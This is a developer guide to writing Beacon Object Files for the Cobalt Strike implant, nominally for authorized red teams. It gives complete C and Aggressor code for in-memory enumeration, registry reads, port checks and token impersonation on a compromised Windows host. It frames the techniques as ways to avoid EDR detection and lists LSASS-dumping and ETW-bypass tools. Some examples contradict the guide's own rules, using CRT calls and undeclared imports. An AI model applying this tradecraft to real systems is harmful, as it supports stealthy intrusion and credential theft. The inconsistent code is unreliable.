# Cobalt Strike — BOF Development Guide (English)

> Beacon Object Files (BOFs) are compiled C object files executed inline within the Beacon process. No new process is spawned, no file is dropped to disk, and the BOF shares the Beacon's memory space. This guide covers writing, compiling, and using BOFs.

---

## Table of Contents

1. [What Are BOFs?](#1-what-are-bofs)
2. [BOF Architecture](#2-bof-architecture)
3. [Development Environment Setup](#3-development-environment-setup)
4. [BOF API Reference](#4-bof-api-reference)
5. [Writing Your First BOF](#5-writing-your-first-bof)
6. [Calling Windows APIs from a BOF](#6-calling-windows-apis-from-a-bof)
7. [Input Arguments (BeaconDataParser)](#7-input-arguments-beacondataparser)
8. [Output (BeaconPrintf / BeaconOutput)](#8-output-beaconprintf--beaconoutput)
9. [Using COFF Functions and Imported DLLs](#9-using-coff-functions-and-imported-dlls)
10. [Error Handling](#10-error-handling)
11. [Complete BOF Examples](#11-complete-bof-examples)
12. [Compiling BOFs](#12-compiling-bofs)
13. [Loading BOFs into Cobalt Strike](#13-loading-bofs-into-cobalt-strike)
14. [Advanced BOF Patterns](#14-advanced-bof-patterns)
15. [BOF Collections & Resources](#15-bof-collections--resources)

---

## 1. What Are BOFs?

A BOF is a **COFF (Common Object File Format)** object file — the intermediate compilation output of a C source file, before linking. Beacon loads it directly into its own memory, resolves symbols, and executes it.

### BOF vs. execute-assembly vs. shell

| Method | Process created? | File on disk? | Crash risk |
|---|---|---|---|
| `shell` | Yes (cmd.exe) | No | No (Beacon unaffected) |
| `powershell` | Yes (powershell.exe) | No | No |
| `execute-assembly` | Yes (spawnto) | No | No (sacrificial) |
| `inline-execute` (BOF) | **No** | **No** | **Yes — crashes Beacon** |

BOFs are the most OPSEC-friendly but highest-risk execution method. A crashing BOF kills the Beacon session.

### When to Use BOFs

- When you need **no process creation** — EDR correlation of parent-child processes is a strong signal
- For quick, simple operations (listing processes, querying registry, token manipulation)
- When you've tested the BOF and are confident it won't crash
- For operations already available in trusted community BOF collections

---

## 2. BOF Architecture

### Execution Flow

```
1. Operator runs: beacon> inline-execute /path/to/bof.o [args]
2. Cobalt Strike reads the .o file
3. Aggressor Script packages arguments into a binary buffer
4. Beacon receives the task containing: BOF bytes + argument buffer
5. Beacon loads the COFF into its process memory
6. Beacon resolves external symbols (Win32 API calls via dynamic resolution)
7. Beacon calls the BOF's entry point (go())
8. BOF executes — output via BeaconPrintf goes back to operator
9. BOF returns — Beacon frees the COFF memory
```

### Key Constraints

- **No CRT** — cannot call `malloc`, `free`, `printf`, `sprintf`, etc. directly
- **No static/global variables** (position-independent code)
- **Must use BeaconDataParser** for input arguments
- **Must use BeaconPrintf/BeaconOutput** for output
- **Must resolve Win32 APIs dynamically** using `KERNEL32$GetProcAddress` pattern
- **Entry point must be named** `go`
- **Position-independent** — no absolute addresses

---

## 3. Development Environment Setup

### Tools Required

```bash
# Option 1: MinGW (cross-compile on Linux/macOS)
sudo apt install mingw-w64

# Option 2: Visual Studio (Windows — cl.exe)
# Install VS Build Tools

# Option 3: Zig (cross-platform, excellent cross-compile support)
sudo apt install zig

# Optional: BOF Development toolkit
git clone https://github.com/trustedsec/COFFLoader    # local testing
git clone https://github.com/Cobalt-Strike/bof_template  # official template
```

### Directory Structure

```
mybof/
├── src/
│   └── mybof.c           # BOF source
├── include/
│   └── beacon.h          # Beacon API headers (from Cobalt Strike)
│   └── bofdefs.h         # Windows API type definitions
├── Makefile
└── mybof.cna             # Aggressor Script to load the BOF
```

### beacon.h (Official API Header)

Download from Cobalt Strike distribution or GitHub. Key declarations:

```c
// Output functions
void BeaconPrintf(int type, char * fmt, ...);
void BeaconOutput(int type, char * data, int len);

// Argument parsing
void BeaconDataParse(datap * parser, char * buffer, int size);
int  BeaconDataInt(datap * parser);
short BeaconDataShort(datap * parser);
int  BeaconDataLength(datap * parser);
char * BeaconDataExtract(datap * parser, int * size);
wchar_t * BeaconDataExtractWchar(datap * parser, int * size);

// Token/process
BOOL BeaconUseToken(HANDLE token);
void BeaconRevertToken();
BOOL BeaconIsAdmin();

// In-process execution (CS 4.1+)
void BeaconGetSpawnTo(BOOL x86, char * buffer, int length);
BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pi);
void BeaconInjectProcess(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
void BeaconInjectTemporaryProcess(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
void BeaconCleanupProcess(PROCESS_INFORMATION * pInfo);

// String utilities
BOOL toWideChar(char * src, wchar_t * dst, int max);
```

---

## 4. BOF API Reference

### Output Types

```c
#define CALLBACK_OUTPUT      0x0   // regular output (white text)
#define CALLBACK_OUTPUT_OOB  0x20  // out-of-band data
#define CALLBACK_ERROR       0x0d  // error (red text)
```

### Parser State

```c
typedef struct {
    char * original;
    char * buffer;
    int    length;
    int    size;
} datap;
```

### Dynamic API Resolution Pattern

```c
// Import a Windows API function dynamically
// Format: <DLLNAME>$<FunctionName>
// DLL name must be UPPERCASE

// kernel32.dll functions:
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualFreeEx(HANDLE, LPVOID, SIZE_T, DWORD);

// ntdll.dll:
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);

// advapi32.dll:
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
WINADVAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

// secur32.dll:
DECLARE_IMPORT(secur32_lib, "secur32.dll");
```

### Beacon Memory Functions

```c
// CS 4.1+ provides these helpers for allocating memory:
void * BeaconDataMalloc(int size);   // not always available, use VirtualAlloc
```

---

## 5. Writing Your First BOF

### Hello World BOF

```c
// hello.c
#include <windows.h>
#include "beacon.h"

void go(char * args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "Hello from BOF!\n");
    BeaconPrintf(CALLBACK_OUTPUT, "Running as: %s\\%s\n",
        getenv("USERDOMAIN"), getenv("USERNAME"));
}
```

Compile:
```bash
x86_64-w64-mingw32-gcc -o hello.o -c hello.c
```

Run in Beacon:
```
beacon> inline-execute hello.o
```

### Whoami BOF

```c
// whoami.c
#include <windows.h>
#include "beacon.h"

// Declare APIs we'll use
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI DWORD  WINAPI KERNEL32$GetCurrentProcessId(VOID);
WINBASEAPI DWORD  WINAPI KERNEL32$GetCurrentThreadId(VOID);
WINADVAPI  BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINADVAPI  BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
WINADVAPI  BOOL   WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

void go(char * args, int alen) {
    HANDLE hProcess = KERNEL32$GetCurrentProcess();
    HANDLE hToken   = NULL;
    DWORD  pid      = KERNEL32$GetCurrentProcessId();
    DWORD  tid      = KERNEL32$GetCurrentThreadId();

    BeaconPrintf(CALLBACK_OUTPUT, "[*] PID: %lu  TID: %lu\n", pid, tid);

    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken failed: %lu\n",
            KERNEL32$GetLastError());
        return;
    }

    // Get token user
    DWORD len = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
    TOKEN_USER * tu = (TOKEN_USER *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, len);
    if (tu && ADVAPI32$GetTokenInformation(hToken, TokenUser, tu, len, &len)) {
        char   name[256] = {0}, domain[256] = {0};
        DWORD  nameLen = 256, domainLen = 256;
        SID_NAME_USE sidUse;
        ADVAPI32$LookupAccountSidA(NULL, tu->User.Sid, name, &nameLen, domain, &domainLen, &sidUse);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] User: %s\\%s\n", domain, name);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, tu);
    }

    KERNEL32$CloseHandle(hToken);
}
```

---

## 6. Calling Windows APIs from a BOF

### The Import Pattern

Every Windows API call in a BOF must use the `DLL$FunctionName` pattern:

```c
// Step 1: Declare the import at the top of the file
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(
    LPCSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
);

// Step 2: Use it in go()
void go(char * args, int alen) {
    HANDLE hFile = KERNEL32$CreateFileA(
        "C:\\Temp\\test.txt",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    // ...
}
```

### Common API Import Declarations

```c
// Kernel32
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI DWORD  WINAPI KERNEL32$GetCurrentProcessId(VOID);
WINBASEAPI DWORD  WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE h);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
WINBASEAPI BOOL   WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualFreeEx(HANDLE, LPVOID, SIZE_T, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
WINBASEAPI BOOL   WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
WINBASEAPI HANDLE WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);

// Advapi32
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
WINADVAPI BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$RevertToSelf(VOID);
WINADVAPI BOOL WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
WINADVAPI LONG WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
WINADVAPI BOOL WINAPI ADVAPI32$RegCloseKey(HKEY);

// Ntdll
NTSYSAPI NTSTATUS NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
NTSYSAPI NTSTATUS NTAPI NTDLL$NtOpenProcess(PHANDLE, ACCESS_MASK, PVOID, PVOID);

// WS2_32
WINSOCK_API_LINKAGE int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
WINSOCK_API_LINKAGE SOCKET WSAAPI WS2_32$socket(int, int, int);
WINSOCK_API_LINKAGE int WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
```

---

## 7. Input Arguments (BeaconDataParser)

Arguments are packed into a binary buffer by the Aggressor Script and parsed in the BOF.

### Parsing Arguments

```c
void go(char * args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int    myInt    = BeaconDataInt(&parser);
    short  myShort  = BeaconDataShort(&parser);
    int    strLen;
    char * myStr    = BeaconDataExtract(&parser, &strLen);
    // Note: strLen includes null terminator for strings
}
```

### Argument Types

| Function | C Type | Aggressor Pack Function |
|---|---|---|
| `BeaconDataInt` | `int` (4 bytes) | `bof_pack("i", $int)` |
| `BeaconDataShort` | `short` (2 bytes) | `bof_pack("s", $short)` |
| `BeaconDataExtract` | `char*` | `bof_pack("z", $str)` |
| `BeaconDataExtractWchar` | `wchar_t*` | `bof_pack("Z", $wstr)` |

### Aggressor Script — Calling BOF with Arguments

```coffeescript
alias mybof {
    local('$bid $args $pid $hostname');
    $bid      = $1;
    $pid      = $2;    # first arg from operator
    $hostname = $3;    # second arg

    # Pack arguments: i = int, z = string (null-terminated)
    $args = bof_pack("iz", int($pid), $hostname);

    # Execute the BOF
    beacon_inline_execute($bid, readb(openf("/path/to/mybof.o")), "go", $args);
    btask($bid, "Running mybof");
}
```

---

## 8. Output (BeaconPrintf / BeaconOutput)

```c
// Printf-style output
BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %d processes\n", count);
BeaconPrintf(CALLBACK_ERROR,  "[-] Error: %lu\n", GetLastError());

// Raw binary output (for structured data)
BeaconOutput(CALLBACK_OUTPUT, buffer, buffer_len);

// Multiple output types:
// CALLBACK_OUTPUT      — normal output (white)
// CALLBACK_ERROR       — error output (red)
// CALLBACK_OUTPUT_OOB  — out-of-band (used for large transfers)
```

---

## 9. Using COFF Functions and Imported DLLs

### sprintf Alternative (No CRT)

```c
// Use MSVCRT$sprintf or build output in a buffer manually
// Or use KERNEL32$wsprintfA (user32-free, no sprintf from CRT)
#include <strsafe.h>
WINBASEAPI HRESULT WINAPI KERNEL32$StringCchPrintfA(LPSTR, SIZE_T, LPCSTR, ...);
```

### String Operations

```c
// Use MSVCRT$ prefix for C runtime functions
// Available: memcpy, memset, strlen, strcmp, etc.
WINBASEAPI int  WINAPI MSVCRT$memcmp(const void*, const void*, size_t);
WINBASEAPI void WINAPI MSVCRT$memset(void*, int, size_t);
WINBASEAPI void WINAPI MSVCRT$memcpy(void*, const void*, size_t);
WINBASEAPI int  WINAPI MSVCRT$strlen(const char*);
WINBASEAPI int  WINAPI MSVCRT$strcmp(const char*, const char*);
WINBASEAPI char* WINAPI MSVCRT$strcat(char*, const char*);
```

---

## 10. Error Handling

```c
void go(char * args, int alen) {
    HANDLE h = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);
    if (h == NULL || h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess failed: %lu\n",
            KERNEL32$GetLastError());
        return;    // always return cleanly — don't crash
    }

    // ... do work ...

    KERNEL32$CloseHandle(h);
}
```

**Critical:** Never let a BOF crash. Always:
- Check return values
- Free allocated memory before returning
- Return cleanly on error

---

## 11. Complete BOF Examples

### Process Lister BOF

```c
// processlist.c — list running processes inline
#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
WINBASEAPI BOOL   WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

void go(char * args, int alen) {
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateToolhelp32Snapshot failed: %lu\n",
            KERNEL32$GetLastError());
        return;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    BeaconPrintf(CALLBACK_OUTPUT, "%-8s %-8s %s\n", "PID", "PPID", "Name");
    BeaconPrintf(CALLBACK_OUTPUT, "%-8s %-8s %s\n", "---", "----", "----");

    if (KERNEL32$Process32FirstW(snap, &pe)) {
        do {
            BeaconPrintf(CALLBACK_OUTPUT, "%-8lu %-8lu %ls\n",
                pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
        } while (KERNEL32$Process32NextW(snap, &pe));
    }

    KERNEL32$CloseHandle(snap);
}
```

### Registry Query BOF

```c
// regquery.c — query a registry value
#include <windows.h>
#include "beacon.h"

WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
WINADVAPI LONG WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

void go(char * args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int    keyLen, valLen;
    char * keyPath = BeaconDataExtract(&parser, &keyLen);
    char * valName = BeaconDataExtract(&parser, &valLen);

    HKEY hKey;
    LONG ret = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] RegOpenKeyEx failed: %ld\n", ret);
        return;
    }

    DWORD type = 0, dataLen = 0;
    ADVAPI32$RegQueryValueExA(hKey, valName, NULL, &type, NULL, &dataLen);

    BYTE * data = (BYTE *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dataLen + 1);
    ret = ADVAPI32$RegQueryValueExA(hKey, valName, NULL, &type, data, &dataLen);

    if (ret == ERROR_SUCCESS) {
        if (type == REG_SZ || type == REG_EXPAND_SZ) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s\\%s = %s\n", keyPath, valName, (char*)data);
        } else if (type == REG_DWORD) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s\\%s = 0x%08lx\n", keyPath, valName, *(DWORD*)data);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Value found (type=%lu, len=%lu)\n", type, dataLen);
        }
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, data);
    ADVAPI32$RegCloseKey(hKey);
}
```

---

## 12. Compiling BOFs

### MinGW (Linux/macOS Cross-Compile)

```makefile
# Makefile
CC_x64 = x86_64-w64-mingw32-gcc
CC_x86 = i686-w64-mingw32-gcc

CFLAGS = -masm=intel -Wall -o

all: processlist.x64.o processlist.x86.o

processlist.x64.o: src/processlist.c
	$(CC_x64) $(CFLAGS) $@ -c $<

processlist.x86.o: src/processlist.c
	$(CC_x86) $(CFLAGS) $@ -c $<

clean:
	rm -f *.o
```

```bash
make
# Output: processlist.x64.o, processlist.x86.o
```

### Visual Studio / cl.exe (Windows)

```batch
cl.exe /c /GS- /O1 src\processlist.c /Fo:processlist.x64.o
```

### Zig (Cross-Platform)

```bash
zig cc -target x86_64-windows -c src/processlist.c -o processlist.x64.o
zig cc -target x86-windows -c src/processlist.c -o processlist.x86.o
```

---

## 13. Loading BOFs into Cobalt Strike

### Method 1: Direct inline-execute

```
beacon> inline-execute /opt/bofs/processlist.x64.o
beacon> inline-execute /opt/bofs/regquery.x64.o "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" "WindowsUpdate"
```

### Method 2: Aggressor Script Alias

```coffeescript
# regquery.cna
alias regquery {
    local('$bid $key $val $args $data');
    $bid = $1;
    $key = $2;
    $val = $3;

    if ($key eq "" || $val eq "") {
        berror($bid, "Usage: regquery <key> <value>");
        return;
    }

    # Pack arguments as null-terminated strings
    $args = bof_pack("zz", $key, $val);

    # Read BOF bytes
    $data = readb(openf(script_resource("regquery.x64.o")));

    # Execute
    beacon_inline_execute($bid, $data, "go", $args);
    btask($bid, "Querying registry: $key\\$val");
}

# Provide help text
beacon_command_register(
    "regquery",
    "Query a registry value inline (no reg.exe spawn)",
    "Usage: regquery <HKLM\\key\\path> <value_name>\n"
);
```

Load the script: `Cobalt Strike → Script Manager → Load → regquery.cna`

Then use:
```
beacon> regquery SOFTWARE\Microsoft\Windows\CurrentVersion\Run WindowsUpdate
```

---

## 14. Advanced BOF Patterns

### Token Manipulation in BOFs

```c
// Impersonate a token from another process
void go(char * args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    int pid = BeaconDataInt(&parser);

    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess failed\n");
        return;
    }

    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken failed\n");
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    // Use BeaconUseToken to set this as Beacon's current token
    if (BeaconUseToken(hToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Token from PID %d applied to Beacon\n", pid);
    }

    KERNEL32$CloseHandle(hToken);
    KERNEL32$CloseHandle(hProcess);
}
```

### Network Connectivity Check BOF

```c
// netcheck.c — check if a host:port is reachable
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "beacon.h"

WINSOCK_API_LINKAGE int    WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
WINSOCK_API_LINKAGE SOCKET WSAAPI WS2_32$socket(int, int, int);
WINSOCK_API_LINKAGE int    WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
WINSOCK_API_LINKAGE int    WSAAPI WS2_32$closesocket(SOCKET);
WINSOCK_API_LINKAGE int    WSAAPI WS2_32$WSACleanup(void);
WINSOCK_API_LINKAGE int    WSAAPI WS2_32$getaddrinfo(PCSTR, PCSTR, const ADDRINFOA*, PADDRINFOA*);
WINSOCK_API_LINKAGE void   WSAAPI WS2_32$freeaddrinfo(PADDRINFOA);

void go(char * args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int    hostLen, portLen;
    char * host = BeaconDataExtract(&parser, &hostLen);
    char * port = BeaconDataExtract(&parser, &portLen);

    WSADATA wsa;
    WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa);

    ADDRINFOA *res = NULL, hints = {0};
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (WS2_32$getaddrinfo(host, port, &hints, &res) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DNS resolution failed for %s\n", host);
        WS2_32$WSACleanup();
        return;
    }

    SOCKET s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (WS2_32$connect(s, res->ai_addr, (int)res->ai_addrlen) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s:%s — OPEN\n", host, port);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %s:%s — CLOSED/FILTERED\n", host, port);
    }

    WS2_32$closesocket(s);
    WS2_32$freeaddrinfo(res);
    WS2_32$WSACleanup();
}
```

---

## 15. BOF Collections & Resources

### Community BOF Collections

| Repository | Contents |
|---|---|
| `trustedsec/CS-Situational-Awareness-BOF` | whoami, netstat, nslookup, dir, env, procdump, listmods |
| `trustedsec/CS-Remote-OPs-BOF` | WMI query, schtasks, service ops, reg ops |
| `outflanknl/CS-Remote-OPs-BOF` | Lateral movement, token, process ops |
| `boku7/injectEtwBypass` | ETW bypass BOF |
| `nanodump` | LSASS dump without suspicious handles |
| `EspressoCake/inject-assembly` | In-process .NET execution |
| `kyleavery/Syscalls-BOF` | Direct syscall BOFs for API unhooking |

### Testing BOFs Locally (Without CS)

```bash
# Use trustedsec/COFFLoader for local testing
git clone https://github.com/trustedsec/COFFLoader
cd COFFLoader
make

# Test a BOF:
./COFFLoader64 processlist.x64.o go ""
./COFFLoader64 regquery.x64.o go pack:zz:"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run":"WindowsUpdate"
```

### Official Resources

- Cobalt Strike blog: [Beacon Object Files](https://www.cobaltstrike.com/blog/beacon-object-files-luser-agent-ioctls-and-targeting-the-cobalt-strike-community-kit)
- Official BOF template: `Cobalt-Strike/bof_template` on GitHub
- `beacon.h` header: in CS distribution at `cobaltstrike/scripts/bof/beacon.h`

---

*Last updated: 2026-06-09 | Reference for authorized red team use only.*
